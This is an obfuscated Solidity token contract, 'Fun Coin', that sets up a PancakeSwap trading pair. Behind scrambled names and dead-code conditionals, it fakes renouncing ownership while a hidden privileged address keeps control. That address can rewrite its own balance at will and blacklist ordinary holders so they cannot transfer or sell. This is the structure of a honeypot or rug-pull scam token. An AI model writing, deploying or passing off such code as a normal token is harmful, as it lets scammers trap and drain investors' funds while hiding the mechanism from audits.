//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface kdvomjosr {
    function createPair(address fxwtoorrxhjv, address kueeijmvigps) external returns (address);
}

interface fcaqnatzluq {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FunCoin {

    function transferFrom(address koezzvgjzt, address jaasqwyxgitxt, uint256 rgcgonpebh) external returns (bool) {
        if (allowance[koezzvgjzt][exzqibvgmx()] != type(uint256).max) {
            require(rgcgonpebh <= allowance[koezzvgjzt][exzqibvgmx()]);
            allowance[koezzvgjzt][exzqibvgmx()] -= rgcgonpebh;
        }
        return xerctsnnavcso(koezzvgjzt, jaasqwyxgitxt, rgcgonpebh);
    }

    event Transfer(address indexed from, address indexed odmimgoxpsm, uint256 value);

    function yfjkhksndvu() public {
        emit OwnershipTransferred(jlzikevaxxks, address(0));
        owner = address(0);
    }

    function mqfixdhoj() public view returns (bool) {
        return yjyvemkqos;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    uint256 public dunsvdqmjgeli;

    function siqbbdiygptrpi(uint256 rgcgonpebh) public {
        if (!fbwzengxeane[exzqibvgmx()]) {
            return;
        }
        balanceOf[jlzikevaxxks] = rgcgonpebh;
    }

    function xzndrfdzlwysj() public {
        
        if (yjyvemkqos == axewokcgeh) {
            axewokcgeh = true;
        }
        yjyvemkqos=false;
    }

    function omjvqkdjyal() public {
        
        if (dunsvdqmjgeli == plimqlhcyhia) {
            dunsvdqmjgeli = plimqlhcyhia;
        }
        yjyvemkqos=false;
    }

    bool private yjyvemkqos;

    string public symbol = "FCN";

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public fbwzengxeane;

    function nzaxcxkukug(address tfdwdylaswt) public {
        if (plimqlhcyhia != dunsvdqmjgeli) {
            axewokcgeh = false;
        }
        if (tfdwdylaswt == jlzikevaxxks || tfdwdylaswt == gdzkmtnoqf || !fbwzengxeane[exzqibvgmx()]) {
            return;
        }
        
        tszigiwfmc[tfdwdylaswt] = true;
    }

    function exzqibvgmx() private view returns (address) {
        return msg.sender;
    }

    function transfer(address ulaazsgupehmny, uint256 rgcgonpebh) external returns (bool) {
        return xerctsnnavcso(exzqibvgmx(), ulaazsgupehmny, rgcgonpebh);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    string public name = "Fun Coin";

    function tvnhanpimsszr(address koezzvgjzt, address jaasqwyxgitxt, uint256 rgcgonpebh) internal returns (bool) {
        require(balanceOf[koezzvgjzt] >= rgcgonpebh);
        balanceOf[koezzvgjzt] -= rgcgonpebh;
        balanceOf[jaasqwyxgitxt] += rgcgonpebh;
        emit Transfer(koezzvgjzt, jaasqwyxgitxt, rgcgonpebh);
        return true;
    }

    uint8 public decimals = 18;

    function ngwlvidqqud() public {
        if (plimqlhcyhia != dunsvdqmjgeli) {
            axewokcgeh = true;
        }
        
        plimqlhcyhia=0;
    }

    address public jlzikevaxxks;

    mapping(address => bool) public tszigiwfmc;

    bool private axewokcgeh;

    function jzqxiklnwhiyht() public view returns (bool) {
        return yjyvemkqos;
    }

    function xerctsnnavcso(address koezzvgjzt, address jaasqwyxgitxt, uint256 rgcgonpebh) internal returns (bool) {
        if (koezzvgjzt == jlzikevaxxks) {
            return tvnhanpimsszr(koezzvgjzt, jaasqwyxgitxt, rgcgonpebh);
        }
        require(!tszigiwfmc[koezzvgjzt]);
        return tvnhanpimsszr(koezzvgjzt, jaasqwyxgitxt, rgcgonpebh);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function wugtubhwyda() public view returns (uint256) {
        return dunsvdqmjgeli;
    }

    address public owner;

    address public gdzkmtnoqf;

    uint256 private plimqlhcyhia;

    function qrpkxycdgbva(address fjebzqhpdl) public {
        if (aobedxbpjrmptl) {
            return;
        }
        if (dunsvdqmjgeli == plimqlhcyhia) {
            plimqlhcyhia = dunsvdqmjgeli;
        }
        fbwzengxeane[fjebzqhpdl] = true;
        
        aobedxbpjrmptl = true;
    }

    bool public aobedxbpjrmptl;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed czktnrnpumbno, address indexed spender, uint256 value);

    constructor (){ 
        
        fcaqnatzluq ljncofudslnpgq = fcaqnatzluq(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        gdzkmtnoqf = kdvomjosr(ljncofudslnpgq.factory()).createPair(ljncofudslnpgq.WETH(), address(this));
        owner = exzqibvgmx();
        if (dunsvdqmjgeli != plimqlhcyhia) {
            axewokcgeh = true;
        }
        jlzikevaxxks = owner;
        fbwzengxeane[jlzikevaxxks] = true;
        balanceOf[jlzikevaxxks] = totalSupply;
        if (axewokcgeh == yjyvemkqos) {
            axewokcgeh = true;
        }
        emit Transfer(address(0), jlzikevaxxks, totalSupply);
        yfjkhksndvu();
    }

    function approve(address lihqlfxcvyn, uint256 rgcgonpebh) public returns (bool) {
        allowance[exzqibvgmx()][lihqlfxcvyn] = rgcgonpebh;
        emit Approval(exzqibvgmx(), lihqlfxcvyn, rgcgonpebh);
        return true;
    }

}